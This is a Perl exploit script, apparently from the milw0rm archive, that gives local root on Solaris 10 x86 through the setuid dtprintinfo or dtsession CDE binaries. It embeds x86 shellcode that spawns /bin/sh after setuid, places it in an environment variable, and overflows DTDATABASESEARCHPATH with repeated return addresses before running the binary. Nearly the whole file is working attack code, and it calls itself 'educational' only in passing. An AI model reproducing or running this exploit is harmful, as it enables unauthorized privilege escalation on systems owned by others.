#!/usr/bin/perl 
#######################################################################
#
# Solaris 10 DtPrintinfo/Session Exploit (x86)
#
# EDUCATIONAL purposes only.... :-)
#
# by Charles Stevenson (core) <core@bokeoa.com>
#
# greetz to raptor for sharing this vulnerability and in no specific
# order just want to show love for: nemo, andrewg, jduck, bannedit,
# runixd, charbuff, sloth, ktha, KF, akt0r, MRX, salvia, etc.
#
# irc.pulltheplug.org (#social)
# 0dd: much <3 & respect
# 
# 10/12/05 - FF local root
#
#######################################################################
#               PRIVATE - DO NOT DISTRIBUTE - PRIVATE                 #
#######################################################################

#You can try lots of dt* suids.  I'm too lazy to code the loop ;-o
$dtsuid = "dtprintinfo";
#$dtsuid = "dtsession";

$sc = "\x90" x (511-108) .

# anathema <anathema@hack.co.za>
"\xeb\x0a\x9a\x01\x02\x03\x5c\x07\x04".
"\xc3\xeb\x05\xe8\xf9\xff\xff\xff\x5e".
"\x29\xc0\x88\x46\xf7\x89\x46\xf2\x50".
"\xb0\x8d\xe8\xe0\xff\xff\xff\x29\xc0".
"\x50\xb0\x17\xe8\xd6\xff\xff\xff\xeb".
"\x1f\x5e\x8d\x1e\x89\x5e\x0b\x29\xc0".
"\x88\x46\x19\x89\x46\x14\x89\x46\x0f".
"\x89\x46\x07\xb0\x3b\x8d\x4e\x0b\x51".
"\x51\x53\x50\xeb\x18\xe8\xdc\xff\xff".
"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01".
"\x01\x01\x01\x02\x02\x02\x02\x03\x03".
"\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

print "\n\n$dtsuid root exploit\n";
print "----------------------------------------------\n";
print "Written by Charles Stevenson <core\@bokeoa.com>\n\n";

# Clear out the environment. 
foreach $key (keys %ENV) { delete $ENV{$key}; } 

# Setup simple env so ret is easier to guess
$ENV{"HELLCODE"} = "$sc"; 
$ENV{"TERM"} = "xterm"; 
$ENV{"DISPLAY"} = "127.0.0.1:0";
$ENV{"PATH"} = "/usr/dt/bin:/bin:/sbin:/usr/sbin:/usr/bin";

# Create the payload...
#$ENV{"DTDATABASESEARCHPATH"} = "////" . "ABCD"x360; # raptor
$ENV{"DTDATABASESEARCHPATH"} = "////" . pack("l",0x8047890)x360;


# If you don't get root try other dt setuid binaries
print "Trying to own $dtsuid...\n";
system("/usr/dt/bin/$dtsuid"); 

# EOF

# milw0rm.com [2005-10-12]
